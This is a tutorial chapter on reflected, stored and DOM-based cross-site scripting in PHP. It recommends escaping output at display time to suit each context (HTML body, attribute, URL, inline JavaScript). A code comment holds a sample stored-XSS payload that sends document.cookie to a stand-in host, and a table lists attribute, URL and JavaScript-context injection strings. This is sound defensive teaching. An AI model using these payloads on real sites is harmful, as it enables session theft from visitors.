---
order: 11
---

# XSS: Reflected, Stored, and DOM-Based

The principle of XSS (*Cross-Site Scripting*) is already established in [Securing Your Data](/?c=langages&s=php&p=securite) (`htmlspecialchars()`, the *reflected* case) and in [Creating and Manipulating Elements](/?c=langages&s=javascript&p=html-elements) (`innerHTML` vs `textContent`, the *DOM-based* case). This chapter doesn't repeat those mechanisms: it lays out the distinction between the three variants (what actually differs between them), then covers what's still missing: database storage (*stored*) and escaping depending on the display CONTEXT.

## The three variants: where the booby-trapped data lives before it displays

The difference between the three comes down to a SINGLE point: where the malicious data sits before it ends up executed in the victim's browser.

```text
REFLECTED (already seen: htmlspecialchars)
  Victim sends a booby-trapped request --> Server returns it AS-IS in its response --> Browser executes it
  (the data only makes a round trip, never stored)

STORED (new in this chapter)
  Attacker --> Booby-trapped data saved to the database (comment, username, review...)
                          |
                          v
  ANY victim who views this page later --> executes the payload
  (the data stays stored: a single injection hits every future visitor)

DOM-BASED (already seen: innerHTML vs textContent)
  Booby-trapped data read directly by JavaScript on the BROWSER side (e.g. a URL parameter)
  --> never returned by the server, never stored: everything happens in the victim's browser
```

| Variant | Where the data passes through | Who's affected | Already covered |
|---|---|---|---|
| Reflected | Request → server response, immediately | Only the victim who clicks a booby-trapped link | [`htmlspecialchars()`](/?c=langages&s=php&p=securite) |
| Stored | Database, between two visits | Every visitor of the affected page, with no booby-trapped action on their part | Section below |
| DOM-based | Never returned by the server, read in JS client-side | The victim, via data THEIR OWN browser reads (URL, `localStorage`...) | [`innerHTML` vs `textContent`](/?c=langages&s=javascript&p=html-elements) |

## Stored XSS: the variant that no longer depends on the victim

A comment form, a username, a customer review: any user data SAVED and later redisplayed to other visitors is a stored target if it isn't escaped at display time.

```php
// Saving (no risk here by itself: we're just storing text)
$pdo->prepare("INSERT INTO comments (text) VALUES (?)")->execute([$comment]);

// DANGEROUS: redisplayed later, with no escaping
foreach ($comments as $c) {
    echo $c['text'];  // if an attacker posted <script>document.location='https://steal.example/?c='+document.cookie</script>,
                       // THIS CODE RUNS for EVERY visitor who sees this comment
}

// SAFE: same reflex as with reflected XSS, applied at DISPLAY time, not at save time
foreach ($comments as $c) {
    echo htmlspecialchars($c['text']);
}
```

> **Pitfall:** escaping data at SAVE time rather than at DISPLAY time. It sounds intuitive ("I clean the input once and for all"), but breaks as soon as the same data is redisplayed in a different context (an HTML page, a CSV export, an email notification) that doesn't need the same escaping (see contexts below). Escaping always happens right before display, never before storage.

## Escaping depends on the display CONTEXT, not just on the text

`htmlspecialchars()` protects data inserted into the BODY of an HTML page. The same reflex applied in a different context doesn't protect against the same risk:

| Insertion context | Example of a dangerous payload | Suitable protection |
|---|---|---|
| HTML body (text between two tags) | `<script>...</script>` | `htmlspecialchars()` (already seen) |
| HTML attribute (`<input value="...">`) | `" onmouseover="alert(1)` (closes the attribute, adds a new one) | Always surround the attribute with quotes AND apply `htmlspecialchars()` to it (which also escapes `"`) |
| URL (`<a href="...">`) | `javascript:alert(document.cookie)` as a URL value | Check that the URL starts with an allowed protocol (`http://`, `https://`) before inserting it |
| Inline JavaScript (`<script>var x = "...";</script>`) | `"; alert(1); //` (closes the JS string, adds a statement) | Never insert user data directly into inline JavaScript: pass it through a `data-*` attribute read afterward on the JS side, or through JSON with escaping dedicated to this context |

> **Best practice:** identify the exact insertion context (text body, attribute, URL, JS) before choosing the escaping, rather than reflexively applying `htmlspecialchars()` everywhere, assuming it's always enough.

---

## 📋 Summary

| | |
|---|---|
| **Key takeaways** | The three XSS variants differ by where the booby-trapped data lives before execution: an immediate round trip (reflected), stored in a database and replayed on every visit (stored), or never returned by the server and read directly in client-side JS (DOM-based). Correct escaping depends on the insertion context (HTML body, attribute, URL, inline JS), not just on the presence of user data. |
| **Tools you can use** | `htmlspecialchars()` for the HTML body and attributes; a protocol check for a URL; `data-*` + a JS read for data meant for JavaScript. |
| **Pitfalls to avoid** | Escaping data at save time rather than at display time; applying the same escaping regardless of the insertion context. |
| **Best practices** | Always escape right at display time, never before; adapt the escaping to the exact context (HTML/attribute/URL/JS). |
